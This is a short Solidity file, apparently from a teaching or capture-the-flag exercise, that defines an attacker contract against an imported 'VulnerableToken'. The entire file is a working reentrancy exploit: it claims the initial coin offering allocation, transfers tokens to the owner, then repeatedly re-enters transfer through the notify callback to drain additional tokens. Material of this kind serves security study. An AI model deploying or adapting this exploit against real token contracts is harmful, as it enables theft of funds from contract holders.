pragma solidity ^0.6.0;

import { ITransferNotify, VulnerableToken as Token } from './Token.sol';

contract AttackerContract is ITransferNotify {

    address public owner;
    address public tokenAddress;
    uint256 public increment;
    bool public isICONotification;

    constructor(address _tokenAddress) public {
        owner = msg.sender;
        tokenAddress = _tokenAddress;
    }

    function attackToken() public {
        Token token = Token(tokenAddress);

        // Get Initial Coin Osffering Token (100).
        token.getInitialCoinOffering(address(0x0));

        // Hack Token Contract.
        token.transfer(owner, 100);
    }

    function notify(address _from, uint256 _amount) public override {
        if (!isICONotification || increment > 9) {
            isICONotification = true;
            return;
        }
        increment++;
        Token token = Token(tokenAddress);
        token.transfer(owner, 100);
    }
}